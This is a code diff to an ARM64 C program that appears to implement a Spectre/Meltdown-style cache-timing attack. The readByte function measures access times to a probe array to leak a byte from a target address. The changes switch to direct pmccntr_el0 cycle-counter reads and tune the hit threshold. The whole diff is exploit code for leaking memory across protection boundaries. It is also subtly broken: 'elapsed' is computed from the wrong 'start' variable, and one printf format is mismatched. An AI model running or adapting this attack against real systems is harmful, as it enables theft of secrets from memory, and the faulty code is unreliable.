@@ -13,7 +13,7 @@
 #include <linux/perf_event.h>
 #include <asm/unistd.h>
 
-#define CACHE_HIT_THRESHOLD (1000)
+#define CACHE_HIT_THRESHOLD (80)
 #define GAP (1024)
 
 // volatile uint64_t countertime = 0;
@@ -24,6 +24,13 @@ unsigned long long count;
 int fd;
 
 clock_t start, end;
+
+static inline uint64_t read_pmccntr(void)
+{
+	uint64_t val;
+	asm volatile("mrs %0, pmccntr_el0" : "=r"(val));
+	return val;
+}
 
 static long perf_event_open(struct perf_event_attr *hw_event, pid_t pid, int cpu, int group_fd, unsigned long flags)
 {
@@ -120,7 +127,7 @@ void readByte(char *addr_to_read, char result[2], int score[2])
 {
   int hits[256]; // record number of cache hits
   int tries, i, j, k, mix_i, junk = 0;
-  uint64_t start, end, elapsed;
+  uint64_t startt, endd, elapsed;
   uint8_t *addr;
   char dummyChar = '$';
 /*  
@@ -182,11 +189,11 @@ void readByte(char *addr_to_read, char result[2], int score[2])
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
       addr = &channel[mix_i * GAP];
-      start = count;
+      startt = read_pmccntr();
       junk ^= *addr;
       asm volatile ("DMB SY"); // make sure read completes before we check the timer
-      end = count;
-      elapsed = end - start;
+      endd = read_pmccntr();
+      elapsed = endd - start;
       // read(fd, &count, sizeof(count));
       if (elapsed <= CACHE_HIT_THRESHOLD) {
         hits[mix_i]++;
@@ -209,7 +216,7 @@ void readByte(char *addr_to_read, char result[2], int score[2])
     }
   }
 
-  // printf("Used %lld instructions\n", count);
+  printf("Used %ld instructions\n", elapsed);
   hits[0] ^= junk; // prevent junk from being optimized out
   result[0] = (char)j;
   score[0] = hits[j];
